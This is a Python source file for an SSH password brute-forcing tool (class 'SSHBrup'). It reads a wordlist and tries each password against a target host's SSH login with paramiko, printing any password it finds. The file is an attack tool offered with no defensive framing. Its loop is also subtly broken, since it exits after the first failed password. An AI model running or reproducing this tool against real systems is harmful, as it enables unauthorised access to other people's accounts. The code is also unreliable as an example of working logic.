import os
import os.path
import socket

import paramiko


class SSHBrup(object):

    def __init__(self, target: str, user: str, file: str) -> None:
        self.target = target
        self.user = user
        self.file = file

    def is_exists(self) -> str:
        if not os.path.isfile(self.file):
            return ''

        if not os.access(self.file, os.R_OK):
            return ''

        if os.path.isfile(self.file) and os.access(self.file, os.R_OK):
            return self.file

        return ''

    def ssh_connect(self, password: str, code: int = 0) -> int:
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

        try:
            ssh.connect(self.target, port=22, username=self.user, password=password, timeout=3)
        except paramiko.AuthenticationException:
            code = 1
        except socket.error:
            code = 2

        ssh.close()

        return code

    def run(self):
        file = self.is_exists()
        with open(file) as fs:
            for item in fs.readlines():
                pwd = item.strip('\n')
                code = self.ssh_connect(pwd)
                if code == 0:
                    print(f'[+] User           : {self.user}')
                    print(f'[+] Password found : {pwd}')
                    break
                if code == 1:
                    print(f'[-] User : {self.user} - Password : {pwd}')
                    break
                if code == 2:
                    print(f'[!] Code : {code} -> {self.target}')
                    break

